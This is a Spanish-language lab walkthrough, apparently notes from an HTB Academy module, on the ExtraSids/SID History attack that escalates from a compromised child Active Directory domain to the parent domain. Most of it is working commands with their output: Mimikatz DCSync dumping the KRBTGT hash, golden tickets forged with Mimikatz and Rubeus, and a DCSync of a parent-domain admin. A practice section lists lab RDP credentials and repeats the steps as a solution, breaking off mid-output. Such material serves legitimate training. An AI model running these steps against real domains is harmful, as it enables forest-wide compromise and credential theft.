
# Ataque de confianza de dominio -  Desde Windows

## <mark style="color:purple;">Introducción al SID History</mark>

El atributo [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) se utiliza en situaciones de migración. Si un usuario de un dominio se migra a otro, se crea una nueva cuenta en el segundo dominio. El SID del usuario original se agregará al atributo de historial de SID del nuevo usuario, lo que garantiza que el usuario aún pueda acceder a los recursos del dominio original.

El historial de SID está pensado para funcionar en todos los dominios, pero puede funcionar en el mismo dominio. Con Mimikatz, un atacante puede realizar una inyección de historial de SID y agregar una cuenta de administrador al atributo Historial de SID de una cuenta que controle. Al iniciar sesión con esta cuenta, todos los SID asociados con la cuenta se agregan al token del usuario.

Este token se utiliza para determinar a qué recursos puede acceder la cuenta. Si el SID de una cuenta de administrador de dominio se agrega al atributo Historial de SID de esta cuenta, esta podrá realizar DCSync y crear un [Golden Ticket](https://attack.mitre.org/techniques/T1558/001/) o un Ticket Granting Ticket (TGT), que nos permitirá autenticarnos como cualquier cuenta en el dominio que elijamos para una mayor persistencia.

***

## <mark style="color:purple;">Ataque de ExtraSids - Mimikatz</mark>

Este ataque permite comprometer un dominio principal una vez que el dominio secundario ha sido comprometido. Dentro del mismo bosque de AD, la propiedad [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) se respeta debido a la falta de protección [de filtrado de SID](https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) . El filtrado de SID es una protección implementada para filtrar las solicitudes de autenticación de un dominio en otro bosque a través de una confianza.&#x20;

Por lo tanto, si un usuario en un dominio secundario tiene su sidHistory configurado en `Enterprise Admins group`(que solo existe en el dominio principal), se lo trata como un miembro de este grupo, lo que permite el acceso administrativo a todo el bosque. En otras palabras, estamos creando un Golden Ticket desde el dominio secundario comprometido para comprometer el dominio principal. En este caso, aprovecharemos para otorgar `SIDHistory` a una cuenta (o cuenta inexistente) derechos de administrador empresarial modificando este atributo para que contenga el SID para el grupo de administradores empresariales, lo que nos dará acceso completo al dominio principal sin ser realmente parte del grupo.

Para realizar este ataque después de comprometer un dominio secundario, necesitamos lo siguiente:

* `El hash KRBTGT para el dominio secundario`
* `El SID del dominio secundario`
* `El nombre de un usuario de destino en el dominio secundario (¡no necesita existir!)`
* `El FQDN del dominio secundario`
* `El SID del grupo Enterprise Admins del dominio raíz`
* `Con estos datos recopilados se puede realizar el ataque con Mimikatz`

Ahora podemos reunir cada pieza de datos necesaria para realizar el ataque ExtraSids. Primero, necesitamos obtener el hash NT para la cuenta [KRBTGT](https://adsecurity.org/?p=483) , que es una cuenta de servicio para el Centro de distribución de claves (KDC) en Active Directory. La cuenta KRB (Kerberos) TGT (Ticket Granting Ticket) se utiliza para cifrar/firmar todos los tickets Kerberos otorgados dentro de un dominio determinado.&#x20;

Los controladores de dominio utilizan la contraseña de la cuenta para descifrar y validar los tickets Kerberos. La cuenta KRBTGT se puede utilizar para crear tickets TGT Kerberos que se pueden utilizar para solicitar tickets TGS para cualquier servicio en cualquier host del dominio. Esto también se conoce como el ataque Golden Ticket y es un mecanismo de persistencia bien conocido por los atacantes en entornos de Active Directory. La única forma de invalidar un Golden Ticket es cambiar la contraseña de la cuenta KRBTGT, lo que debe hacerse periódicamente y definitivamente después de una evaluación de prueba de penetración donde se alcance un compromiso total del dominio.

Como hemos comprometido el dominio secundario, podemos iniciar sesión como administrador de dominio o similar y realizar el ataque DCSync para obtener el hash NT para la cuenta KRBTGT.

### **Obtener el hash NT de la cuenta KRBTGT mediante Mimikatz**

```powershell
PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'LOGISTICS\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/1/2021 11:21:33 AM
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
    ntlm- 0: 9d765b482771505cbe97411065964d5f
    lm  - 0: 69df324191d4a80f0ed100c10f20561e
```

Podemos usar la función `Get-DomainSID` de PowerView para obtener el SID del dominio secundario, pero esto también es visible en la salida de Mimikatz anterior.

### **Obtener SID del dominio secundario con Get-DomainSID**

```powershell
PS C:\htb> Get-DomainSID

S-1-5-21-2806153819-209893948-922872689
```

A continuación, podemos utilizar `Get-DomainGroup` de PowerView para obtener el SID del grupo de administradores de empresa en el dominio principal. También podemos hacerlo con el cmdlet [Get-ADGroup](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps) con un comando como `Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"`.

### **Obtener el SID del grupo Enterprise Admins con Get-DomainGroup**

```powershell
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                       objectsid                                    
-----------------                                       ---------                                    
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```

En este punto, hemos recopilado los siguientes puntos de datos:

* El hash KRBTGT para el dominio secundario: `9d765b482771505cbe97411065964d5f`
* El SID del dominio secundario: `S-1-5-21-2806153819-209893948-922872689`
* El nombre de un usuario objetivo en el dominio secundario (¡no necesita existir para crear nuestro Golden Ticket!): Elegiremos un usuario falso: `hacker`
* El FQDN del dominio secundario: `LOGISTICS.INLANEFREIGHT.LOCAL`
* El SID del grupo de Enterprise Admins del dominio raíz: `S-1-5-21-3842939050-3880317879-2865463114-519`

Antes del ataque, podemos confirmar que no hubo acceso al sistema de archivos del DC en el dominio principal.

### **Uso de ls para confirmar que no hay acceso**

```powershell
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied
At line:1 char:1
+ ls \\academy-ea-dc01.inlanefreight.local\c$
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

Usando Mimikatz y los datos enumerados anteriormente, podemos crear un Golden Ticket para acceder a todos los recursos dentro del dominio principal.

### **Creando un GoldenTicket con Mimikatz**

```powershell
PS C:\htb> mimikatz.exe

mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
Lifetime  : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
```

Podemos confirmar que el ticket Kerberos para el usuario hacker inexistente reside en la memoria.

### **Confirmar que el ticket Kerberos está en la memoria mediante klist**

```
PS C:\htb> klist

Current LogonId is 0:0xf6462

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/28/2022 19:59:50 (local)
        End Time:   3/25/2032 19:59:50 (local)
        Renew Time: 3/25/2032 19:59:50 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

Desde aquí, es posible acceder a cualquier recurso dentro del dominio principal y podríamos comprometer el dominio principal de varias maneras.

### **Listado de toda la unidad C: del controlador de dominio**

```powershell
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
 Volume in drive \\academy-ea-dc01.inlanefreight.local\c$ has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\academy-ea-dc01.inlanefreight.local\c$

09/15/2018  12:19 AM    <DIR>          PerfLogs
10/06/2021  01:50 PM    <DIR>          Program Files
09/15/2018  02:06 AM    <DIR>          Program Files (x86)
11/19/2021  12:17 PM    <DIR>          Shares
10/06/2021  10:31 AM    <DIR>          Users
03/21/2022  12:18 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  18,080,178,176 bytes free
```

***

## <mark style="color:purple;">Ataque de ExtraSids - Rubeus</mark>

También podemos realizar este ataque con Rubeus. En primer lugar, nuevamente, confirmaremos que no podemos acceder al sistema de archivos del controlador de dominio del dominio principal.

### **Usar ls para confirmar que no hay acceso antes de ejecutar Rubeus**

```powershell
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied
At line:1 char:1
+ ls \\academy-ea-dc01.inlanefreight.local\c$
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], UnauthorizedAcces 
   sException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
	
<SNIP> 
```

A continuación, formularemos nuestro comando Rubeus utilizando los datos que recuperamos anteriormente. El indicador `/rc4` es el hash NT para la cuenta KRBTGT. El indicador `/sids` le indicará a Rubeus que cree nuestro Golden Ticket, lo que nos otorgará los mismos derechos que a los miembros del grupo `Enterprise Admins` en el dominio principal.

### **Crear un Golden Ticket con Rubeus**

```powershell
PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2 

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
[*] SID            : S-1-5-21-2806153819-209893948-922872689
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-3842939050-3880317879-2865463114-519
[*] ServiceKey     : 9D765B482771505CBE97411065964D5F
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 9D765B482771505CBE97411065964D5F
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'hacker@LOGISTICS.INLANEFREIGHT.LOCAL'

[*] AuthTime       : 3/29/2022 10:06:41 AM
[*] StartTime      : 3/29/2022 10:06:41 AM
[*] EndTime        : 3/29/2022 8:06:41 PM
[*] RenewTill      : 4/5/2022 10:06:41 AM

[*] base64(ticket.kirbi):
      doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoR8bHUxPR0lTVElDUy5JTkxBTkVG
      UkVJR0hULkxPQ0FMojIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5M
      T0NBTKOCBDIwggQuoAMCARehAwIBA6KCBCAEggQc0u5onpWKAP0Hw0KJuEOAFp8OgfBXlkwH3sXu5BhH
      T3zO/Ykw2Hkq2wsoODrBj0VfvxDNNpvysToaQdjHIqIqVQ9kXfNHM7bsQezS7L1KSx++2iX94uRrwa/S
      VfgHhAuxKPlIi2phwjkxYETluKl26AUo2+WwxDXmXwGJ6LLWN1W4YGScgXAX+Kgs9xrAqJMabsAQqDfy
      k7+0EH9SbmdQYqvAPrBqYEnt0mIPM9cakei5ZS1qfUDWjUN4mxsqINm7qNQcZHWN8kFSfAbqyD/OZIMc
      g78hZ8IYL+Y4LPEpiQzM8JsXqUdQtiJXM3Eig6RulSxCo9rc5YUWTaHx/i3PfWqP+dNREtldE2sgIUQm
      9f3cO1aOCt517Mmo7lICBFXUTQJvfGFtYdc01fWLoN45AtdpJro81GwihIFMcp/vmPBlqQGxAtRKzgzY
      acuk8YYogiP6815+x4vSZEL2JOJyLXSW0OPhguYSqAIEQshOkBm2p2jahQWYvCPPDd/EFM7S3NdMnJOz
      X3P7ObzVTAPQ/o9lSaXlopQH6L46z6PTcC/4GwaRbqVnm1RU0O3VpVr5bgaR+Nas5VYGBYIHOw3Qx5YT
      3dtLvCxNa3cEgllr9N0BjCl1iQGWyFo72JYI9JLV0VAjnyRxFqHztiSctDExnwqWiyDaGET31PRdEz+H
      WlAi4Y56GaDPrSZFS1RHofKqehMQD6gNrIxWPHdS9aiMAnhQth8GKbLqimcVrCUG+eghE+CN999gHNMG
      Be1Vnz8Oc3DIM9FNLFVZiqJrAvsq2paakZnjf5HXOZ6EdqWkwiWpbGXv4qyuZ8jnUyHxavOOPDAHdVeo
      /RIfLx12GlLzN5y7132Rj4iZlkVgAyB6+PIpjuDLDSq6UJnHRkYlJ/3l5j0KxgjdZbwoFbC7p76IPC3B
      aY97mXatvMfrrc/Aw5JaIFSaOYQ8M/frCG738e90IK/2eTFZD9/kKXDgmwMowBEmT3IWj9lgOixNcNV/
      OPbuqR9QiT4psvzLGmd0jxu4JSm8Usw5iBiIuW/pwcHKFgL1hCBEtUkaWH24fuJuAIdei0r9DolImqC3
      sERVQ5VSc7u4oaAIyv7Acq+UrPMwnrkDrB6C7WBXiuoBAzPQULPTWih6LyAwenrpd0sOEOiPvh8NlvIH
      eOhKwWOY6GVpVWEShRLDl9/XLxdnRfnNZgn2SvHOAJfYbRgRHMWAfzA+2+xps6WS/NNf1vZtUV/KRLlW
      sL5v91jmzGiZQcENkLeozZ7kIsY/zadFqVnrnQqsd97qcLYktZ4yOYpxH43JYS2e+cXZ+NXLKxex37HQ
      F5aNP7EITdjQds0lbyb9K/iUY27iyw7dRVLz3y5Dic4S4+cvJBSz6Y1zJHpLkDfYVQbBUCfUps8ImJij
      Hf+jggEhMIIBHaADAgEAooIBFASCARB9ggEMMIIBCKCCAQQwggEAMIH9oBswGaADAgEXoRIEEBrCyB2T
      JTKolmppTTXOXQShHxsdTE9HSVNUSUNTLklOTEFORUZSRUlHSFQuTE9DQUyiEzARoAMCAQGhCjAIGwZo
      YWNrZXKjBwMFAEDgAACkERgPMjAyMjAzMjkxNzA2NDFapREYDzIwMjIwMzI5MTcwNjQxWqYRGA8yMDIy
      MDMzMDAzMDY0MVqnERgPMjAyMjA0MDUxNzA2NDFaqB8bHUxPR0lTVElDUy5JTkxBTkVGUkVJR0hULkxP
      Q0FMqTIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5MT0NBTA==

[+] Ticket successfully imported!
```

Una vez más, podemos comprobar que el ticket está en memoria mediante el comando `klist`.

### **Confirmar que el ticket está en la memoria usando klist**

```powershell-session
PS C:\htb> klist

Current LogonId is 0:0xf6495

Cached Tickets: (1)

#0>	Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
	Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
	Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent 
	Start Time: 3/29/2022 10:06:41 (local)
	End Time:   3/29/2022 20:06:41 (local)
	Renew Time: 4/5/2022 10:06:41 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: 
```

Finalmente, podemos probar este acceso realizando un ataque DCSync contra el dominio principal, dirigido al usuario administrador del dominio `lab_adm`.

### **Realizar un ataque DCSync**

```powershell
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\lab_adm' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : lab_adm

** SAM ACCOUNT **

SAM Username         : lab_adm
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/27/2022 10:53:21 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
Object Relative ID   : 1001

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
    lm  - 0: 6053227db44e996fe16b107d9d1e95a0
```

Cuando trabajamos con varios dominios y nuestro dominio de destino no es el mismo que el dominio del usuario, necesitaremos especificar el dominio exacto para realizar la operación DCSync en el controlador de dominio en particular. El comando para esto sería similar al siguiente:

```powershell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\lab_adm' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : lab_adm

** SAM ACCOUNT **

SAM Username         : lab_adm
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/27/2022 10:53:21 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
Object Relative ID   : 1001

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
    lm  - 0: 6053227db44e996fe16b107d9d1e95a0
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
RDP a 10.129.116.255 (ACADEMY-EA-DC02)
user "htb-student_adm"
password "HTB_@cademy_stdnt_admin!"
```

Realiza el ataque ExtraSids para comprometer el dominio principal. Envíe el contenido del archivo `flag.txt` ubicado en la carpeta `c:\ExtraSids` del controlador de dominio ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL en el dominio principal.

#### Obtener hash NT de la cuenta KRBTGT como Mimikatz

```powershell
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 02:01:23
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'LOGISTICS\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/1/2021 11:21:33 AM
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
    ntlm- 0: 9d765b482771505cbe97411065964d5f
    lm  - 0: 69df324191d4a80f0ed100c10f20561e
```

#### Obtener SID del dominio secundario

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainSID
S-1-5-21-2806153819-209893948-922872689
```

#### Obtener SID del grupo Enterprise Admins

```powershell
PS C:\Tools> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                       objectsid
-----------------                                       ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```

#### Datos recopilados:

```
- Hash NTLM de la cuenta KRBTGT:   9d765b482771505cbe97411065964d5f
- SID del Dominio Secundario:      S-1-5-21-2806153819-209893948-922872689
- SID del Grupo Enterprise Admins: S-1-5-21-3842939050-3880317879-2865463114-519
- Usuario que no existe:           hacker
- FQDN del dominio secundario:     LOGISTICS.INLANEFREIGHT.LOCAL
```

Con estos datos ya podemos generar un Golden Ticket para acceder a cualquier archivo del DC

#### Comprobar que no tenemos acceso con ls

```powershell
PS C:\Tools> ls \\academy-ea-dc01.inlanefreight.local\c$
ls : Access is denied
At line:1 char:1
+ ls \\academy-ea-dc01.inlanefreight.local\c$
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

ls : Cannot find path '\\academy-ea-dc01.inlanefreight.local\c$' because it does not exist.
At line:1 char:1
+ ls \\academy-ea-dc01.inlanefreight.local\c$
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
```

#### Crear Golden Ticket con Rubeus

```powershell
PS C:\Tools> .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
[*] SID            : S-1-5-21-2806153819-209893948-922872689
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-3842939050-3880317879-2865463114-519
[*] ServiceKey     : 9D765B482771505CBE97411065964D5F
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 9D765B482771505CBE97411065964D5F
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'hacker@LOGISTICS.INLANEFREIGHT.LOCAL'

[*] AuthTime       : 7/26/2024 4:23:26 AM
[*] StartTime      : 7/26/2024 4:23:26 AM
[*] EndTime        : 7/26/2024 2:23:26 PM
[*] RenewTill      : 8/2/2024 4:23:26 AM

[*] base64(ticket.kirbi):

      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


[+] Ticket successfully imported!
```

#### Comprobar que el ticket está en memoria

```powershell
PS C:\Tools> klist

Current LogonId is 0:0x63283

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 7/26/2024 4:23:26 (local)
        End Time:   7/26/2024 14:23:26 (local)
